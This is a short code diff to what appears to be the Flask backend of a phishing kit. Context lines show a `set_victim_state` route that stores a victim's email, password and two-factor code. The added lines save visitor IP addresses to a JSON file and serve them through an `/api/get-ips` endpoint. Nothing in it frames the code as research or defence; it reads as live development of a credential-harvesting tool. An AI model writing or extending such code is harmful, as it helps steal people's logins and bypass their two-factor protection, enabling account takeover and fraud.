@@ -577,13 +577,25 @@ def set_victim_state():
     state = set_state(status, email, password, two_fa_code)
     return jsonify({'status': 'success', 'state': state})
 
+IP_LOG_FILE = BASE_DIR / 'visitor_ips.json'
 visitor_ips = []
+if IP_LOG_FILE.exists():
+    try:
+        with open(IP_LOG_FILE, 'r') as f:
+            visitor_ips = json.load(f)
+    except:
+        visitor_ips = []
+
+def save_ips():
+    with open(IP_LOG_FILE, 'w') as f:
+        json.dump(visitor_ips, f)
 
 @app.before_request
 def log_visitor_ip():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    if ip and ip not in visitor_ips:
+    if ip and ip not in [v['ip'] for v in visitor_ips]:
         visitor_ips.append({'ip': ip, 'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")})
+        save_ips()
 
 @app.route('/api/get-ips')
 def get_ips():
